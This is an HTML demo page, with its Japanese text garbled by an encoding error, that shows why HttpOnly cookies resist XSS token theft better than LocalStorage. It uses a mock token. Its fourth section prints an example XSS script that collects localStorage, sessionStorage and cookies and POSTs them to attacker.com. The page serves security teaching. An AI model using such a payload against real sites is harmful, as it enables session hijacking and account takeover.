<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSSä¿è­·ãƒ‡ãƒ¢ - Charactier AI</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 2rem;
            background: #f9fafb;
        }
        .card {
            background: white;
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        h1 {
            color: #1f2937;
            margin-bottom: 2rem;
        }
        h2 {
            color: #374151;
            margin-top: 0;
        }
        .alert {
            padding: 1rem;
            border-radius: 6px;
            margin: 1rem 0;
        }
        .alert-danger {
            background: #fee;
            border: 1px solid #fcc;
            color: #c00;
        }
        .alert-success {
            background: #efe;
            border: 1px solid #cfc;
            color: #060;
        }
        .alert-info {
            background: #e6f3ff;
            border: 1px solid #b3d9ff;
            color: #0066cc;
        }
        button {
            background: #7c3aed;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            margin-right: 0.5rem;
            margin-bottom: 0.5rem;
        }
        button:hover {
            background: #6d28d9;
        }
        button.danger {
            background: #dc2626;
        }
        button.danger:hover {
            background: #b91c1c;
        }
        pre {
            background: #f3f4f6;
            padding: 1rem;
            border-radius: 6px;
            overflow-x: auto;
            font-size: 0.875rem;
        }
        .result {
            margin-top: 1rem;
            padding: 1rem;
            background: #f9fafb;
            border-radius: 6px;
            border: 1px solid #e5e7eb;
        }
    </style>
</head>
<body>
    <h1>ğŸ›¡ï¸ XSSä¿è­·ãƒ‡ãƒ¢ãƒ³ã‚¹ãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³</h1>

    <div class="alert alert-info">
        <strong>ğŸ“Œ ã“ã®ãƒšãƒ¼ã‚¸ã«ã¤ã„ã¦:</strong><br>
        LocalStorageæ–¹å¼ã¨HttpOnly Cookieæ–¹å¼ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®é•ã„ã‚’å®Ÿéš›ã«ä½“é¨“ã§ãã¾ã™ã€‚
    </div>

    <div class="card">
        <h2>1. ãƒ†ã‚¹ãƒˆç”¨ãƒˆãƒ¼ã‚¯ãƒ³ã®è¨­å®š</h2>
        <p>ã¾ãšã€ãƒ†ã‚¹ãƒˆç”¨ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¨­å®šã—ã¾ã™ã€‚</p>
        <button onclick="setupTokens()">ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¨­å®š</button>
        <button onclick="clearTokens()" class="danger">ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚¯ãƒªã‚¢</button>
        <div id="setup-result" class="result" style="display:none;"></div>
    </div>

    <div class="card">
        <h2>2. LocalStorageæ–¹å¼ã®ãƒ†ã‚¹ãƒˆï¼ˆå¾“æ¥æ–¹å¼ï¼‰</h2>
        <p>XSSæ”»æ’ƒã‚’ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ãƒˆã—ã¦ã€LocalStorageã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã¾ã™ã€‚</p>
        <button onclick="simulateXSSLocalStorage()">XSSæ”»æ’ƒã‚’ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ãƒˆ</button>
        <div id="localstorage-result" class="result" style="display:none;"></div>
    </div>

    <div class="card">
        <h2>3. HttpOnly Cookieæ–¹å¼ã®ãƒ†ã‚¹ãƒˆï¼ˆæ–°æ–¹å¼ï¼‰</h2>
        <p>åŒã˜XSSæ”»æ’ƒã‚’è©¦ã¿ã¾ã™ãŒã€HttpOnly Cookieã¯èª­ã¿å–ã‚Œã¾ã›ã‚“ã€‚</p>
        <button onclick="simulateXSSCookie()">XSSæ”»æ’ƒã‚’ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ãƒˆ</button>
        <div id="cookie-result" class="result" style="display:none;"></div>
    </div>

    <div class="card">
        <h2>4. å®Ÿéš›ã®XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ä¾‹</h2>
        <p>ä»¥ä¸‹ã¯å®Ÿéš›ã®XSSæ”»æ’ƒã§ä½¿ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã§ã™ï¼š</p>
        <pre><code>&lt;script&gt;
// ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰
(function() {
    const tokens = {
        localStorage: localStorage.getItem('accessToken'),
        sessionStorage: sessionStorage.getItem('accessToken'),
        cookies: document.cookie
    };
    
    // æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(tokens)
    });
})();
&lt;/script&gt;</code></pre>
    </div>

    <script>
        // ãƒ¢ãƒƒã‚¯ãƒˆãƒ¼ã‚¯ãƒ³
        const mockToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1MDdmMWY3N2JjZjg2Y2Q3OTk0MzkwMTEiLCJpYXQiOjE2OTUwMjQwMDAsImV4cCI6MTY5NTExMDQwMH0.mock_signature_for_demo';
        
        function setupTokens() {
            // LocalStorageã«ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä¿å­˜
            localStorage.setItem('accessToken', mockToken);
            localStorage.setItem('refreshToken', mockToken + '_refresh');
            
            // é€šå¸¸ã®Cookieï¼ˆJavaScriptã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ï¼‰
            document.cookie = `normalToken=${mockToken}; path=/`;
            
            // HttpOnly Cookieã¯ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰ã¯è¨­å®šã§ããªã„ï¼ˆã‚µãƒ¼ãƒãƒ¼å´ã§è¨­å®šï¼‰
            
            const result = document.getElementById('setup-result');
            result.style.display = 'block';
            result.innerHTML = `
                <div class="alert alert-success">
                    âœ… ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¨­å®šã—ã¾ã—ãŸï¼
                </div>
                <strong>LocalStorage:</strong>
                <pre>accessToken: ${mockToken.substring(0, 30)}...
refreshToken: ${(mockToken + '_refresh').substring(0, 30)}...</pre>
                <strong>é€šå¸¸ã®Cookie:</strong>
                <pre>normalToken: ${mockToken.substring(0, 30)}...</pre>
                <strong>HttpOnly Cookie:</strong>
                <pre>ï¼ˆã‚µãƒ¼ãƒãƒ¼å´ã§ã®ã¿è¨­å®šå¯èƒ½ï¼‰</pre>
            `;
        }
        
        function clearTokens() {
            localStorage.removeItem('accessToken');
            localStorage.removeItem('refreshToken');
            document.cookie = 'normalToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
            
            const result = document.getElementById('setup-result');
            result.style.display = 'block';
            result.innerHTML = '<div class="alert alert-info">ğŸ—‘ï¸ ã™ã¹ã¦ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚¯ãƒªã‚¢ã—ã¾ã—ãŸã€‚</div>';
        }
        
        function simulateXSSLocalStorage() {
            // XSSæ”»æ’ƒã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³
            const stolenData = {
                localStorage: {
                    accessToken: localStorage.getItem('accessToken'),
                    refreshToken: localStorage.getItem('refreshToken')
                },
                sessionStorage: {
                    accessToken: sessionStorage.getItem('accessToken')
                },
                allLocalStorageKeys: Object.keys(localStorage)
            };
            
            const result = document.getElementById('localstorage-result');
            result.style.display = 'block';
            
            if (stolenData.localStorage.accessToken) {
                result.innerHTML = `
                    <div class="alert alert-danger">
                        âš ï¸ <strong>ãƒˆãƒ¼ã‚¯ãƒ³ãŒç›—ã¾ã‚Œã¾ã—ãŸï¼</strong>
                    </div>
                    <strong>ç›—ã¾ã‚ŒãŸãƒ‡ãƒ¼ã‚¿:</strong>
                    <pre>${JSON.stringify(stolenData, null, 2)}</pre>
                    <p>æ”»æ’ƒè€…ã¯ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
                `;
            } else {
                result.innerHTML = `
                    <div class="alert alert-info">
                        ğŸ“ LocalStorageã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã€‚å…ˆã«ã€Œãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¨­å®šã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
                    </div>
                `;
            }
        }
        
        function simulateXSSCookie() {
            // Cookieå–å¾—ã‚’è©¦ã¿ã‚‹
            const allCookies = document.cookie;
            const cookieObj = {};
            
            allCookies.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name) cookieObj[name] = value;
            });
            
            const result = document.getElementById('cookie-result');
            result.style.display = 'block';
            
            result.innerHTML = `
                <div class="alert alert-success">
                    âœ… <strong>HttpOnly Cookieã¯ä¿è­·ã•ã‚Œã¦ã„ã¾ã™ï¼</strong>
                </div>
                <strong>JavaScriptã‹ã‚‰è¦‹ãˆã‚‹Cookie:</strong>
                <pre>${JSON.stringify(cookieObj, null, 2)}</pre>
                <p><strong>æ³¨æ„:</strong> HttpOnlyå±æ€§ãŒè¨­å®šã•ã‚ŒãŸCookieï¼ˆuserAccessTokenã€userRefreshTokenãªã©ï¼‰ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚</p>
                <div class="alert alert-info">
                    ğŸ’¡ HttpOnly Cookieã¯ãƒ–ãƒ©ã‚¦ã‚¶ãŒè‡ªå‹•çš„ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å«ã‚ã¾ã™ãŒã€JavaScriptã‹ã‚‰ã¯èª­ã¿å–ã‚Œã¾ã›ã‚“ã€‚
                </div>
            `;
        }
        
        // ãƒšãƒ¼ã‚¸èª­ã¿è¾¼ã¿æ™‚ã®çŠ¶æ…‹ã‚’è¡¨ç¤º
        window.onload = function() {
            console.log('ğŸ” ç¾åœ¨ã®èªè¨¼æƒ…å ±:');
            console.log('LocalStorage:', localStorage.getItem('accessToken') ? 'å­˜åœ¨' : 'ãªã—');
            console.log('Cookies:', document.cookie || 'ãªã—');
        };
    </script>
</body>
</html>